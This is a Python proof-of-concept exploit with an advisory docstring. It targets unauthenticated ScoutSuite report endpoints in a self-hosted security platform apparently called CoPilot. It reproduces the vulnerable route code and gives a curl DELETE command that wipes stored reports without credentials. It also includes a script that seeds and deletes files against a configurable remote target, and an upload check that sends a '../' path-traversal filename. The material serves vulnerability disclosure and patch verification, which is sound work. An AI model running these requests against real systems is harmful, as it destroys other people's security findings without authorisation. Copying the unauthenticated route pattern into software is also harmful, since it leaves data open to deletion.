"""
PoC 03 — ScoutSuite router: unauthenticated report deletion (verified live 2026-04-21)

VULNERABILITY
─────────────
Every endpoint under /api/scoutsuite/* requires zero authentication.
The DELETE /api/scoutsuite/delete-report/{report_name} endpoint removes
any stored ScoutSuite cloud-security report without credentials.

IMPACT
──────
An unauthenticated attacker can enumerate and wipe every HTML report,
results JS file, and exceptions file from scoutsuite-report/ — destroying
all stored cloud-security findings with no account required.

AFFECTED CODE
─────────────
backend/app/integrations/scoutsuite/routes/scoutsuite.py

    @integration_scoutsuite_router.delete("/delete-report/{report_name}")
    async def delete_report(report_name: str):          # no auth dependency
        report_file_path = f"scoutsuite-report/{report_name}"
        ...
        os.remove(file_path)

QUICK REPRODUCTION (no Python required)
────────────────────────────────────────
1. Seed a report file on the server:
     docker exec copilot-main-copilot-backend-1 sh -c "echo test > scoutsuite-report/POC_DELETE_ME.html"

2. Delete it without a token:
     curl -sk -X DELETE http://localhost:5000/api/scoutsuite/delete-report/POC_DELETE_ME.html

3. Confirm it's gone:
     docker exec copilot-main-copilot-backend-1 ls scoutsuite-report/

Expected: step 2 returns HTTP 200 and step 3 shows an empty directory.

SCRIPT USAGE
────────────
    pip install requests

    # Full run (seeds file via docker, deletes via API, confirms gone):
    python 03_scoutsuite_path_traversal.py --mode delete

    # Also verify the upload traversal is patched:
    python 03_scoutsuite_path_traversal.py --mode upload-check

    # Custom target (e.g. remote host):
    python 03_scoutsuite_path_traversal.py --target http://10.0.0.5:5000 --mode delete

Ethics: run only against systems you own or have written authorisation to test.
"""
from __future__ import annotations

import argparse
import json
import sys

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("Install requests: pip install requests")

VERIFY_TLS = False

MINIMAL_GCP_JSON = {
    "type": "service_account",
    "project_id": "poc",
    "private_key_id": "poc",
    "private_key": "-----BEGIN PRIVATE KEY-----\nPOC\n-----END PRIVATE KEY-----\n",
    "client_email": "poc@example.iam.gserviceaccount.com",
    "client_id": "000000000000000000000",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://example.com",
    "universe_domain": "googleapis.com",
}


def check_upload(target: str) -> None:
    """
    Verify upload path traversal is patched.
    Sends filename='../SECURITY_POC_MARKER.json'.
    PATCHED  → server returns 200; file lands inside scoutsuite-report/.
    VULNERABLE → file appears one directory above scoutsuite-report/.
    """
    url = f"{target.rstrip('/')}/api/scoutsuite/generate-gcp-report"
    traversal_filename = "../SECURITY_POC_MARKER.json"
    files = {"file": (traversal_filename, json.dumps(MINIMAL_GCP_JSON), "application/json")}
    print(f"[*] Upload check — POST {url}")
    print(f"    file.filename = {traversal_filename!r}")
    r = requests.post(url, files=files, timeout=30, verify=VERIFY_TLS)
    print(f"    HTTP {r.status_code}  {r.text[:200]}")
    if r.status_code == 200:
        print("[+] Server accepted the upload.")
        print("    PATCHED behaviour: file is at scoutsuite-report/SECURITY_POC_MARKER.json")
        print("    (os.path.basename() stripped the '../' traversal component)")
    elif r.status_code == 400:
        print("[+] Rejected with 400 — traversal blocked at validation.")
    else:
        print(f"[-] Unexpected HTTP {r.status_code}")


def _seed_via_docker(report_name: str) -> bool:
    """Try to plant the target file via docker exec. Returns True on success."""
    import subprocess
    try:
        result = subprocess.run(
            ["docker", "exec", "copilot-main-copilot-backend-1", "sh", "-c",
             f"echo poc_marker > scoutsuite-report/{report_name}"],
            capture_output=True, timeout=10,
        )
        return result.returncode == 0
    except Exception:
        return False


def delete_report(target: str, report_name: str) -> None:
    # Try to seed the file automatically so the test is self-contained.
    print(f"[*] Seeding scoutsuite-report/{report_name} via docker exec ...")
    if _seed_via_docker(report_name):
        print(f"    Seeded.")
    else:
        print(f"    docker exec failed — seed the file manually then re-run:")
        print(f'      docker exec copilot-main-copilot-backend-1 sh -c "echo test > scoutsuite-report/{report_name}"')
        print()

    url = f"{target.rstrip('/')}/api/scoutsuite/delete-report/{report_name}"
    print(f"[*] DELETE {url}  (no Authorization header)")
    r = requests.delete(url, timeout=15, verify=VERIFY_TLS)
    print(f"    HTTP {r.status_code}  {r.text[:300]}")
    if r.status_code == 200:
        print(f"\n[!] EXPLOIT CONFIRMED — '{report_name}' deleted from scoutsuite-report/ with no credentials.")
    else:
        print(f"\n[-] Unexpected HTTP {r.status_code}.")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", default="https://localhost",
                    help="CoPilot base URL (default: https://localhost). "
                         "Use http://localhost:5000 to bypass nginx.")
    ap.add_argument("--mode", choices=["upload-check", "delete", "both"],
                    default="both",
                    help="upload-check: verify upload traversal is patched; "
                         "delete: prove unauthenticated report deletion; "
                         "both (default)")
    ap.add_argument("--report-name", default="POC_DELETE_ME.html",
                    help="Filename inside scoutsuite-report/ to delete (default: POC_DELETE_ME.html). "
                         "Slashes not allowed — deletion is bounded to scoutsuite-report/.")
    ap.add_argument("--verify-tls", action="store_true",
                    help="Verify TLS cert (disabled by default for self-signed certs)")
    args = ap.parse_args()

    global VERIFY_TLS
    VERIFY_TLS = args.verify_tls

    if args.mode in ("upload-check", "both"):
        check_upload(args.target)
        print()

    if args.mode in ("delete", "both"):
        delete_report(args.target, args.report_name)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
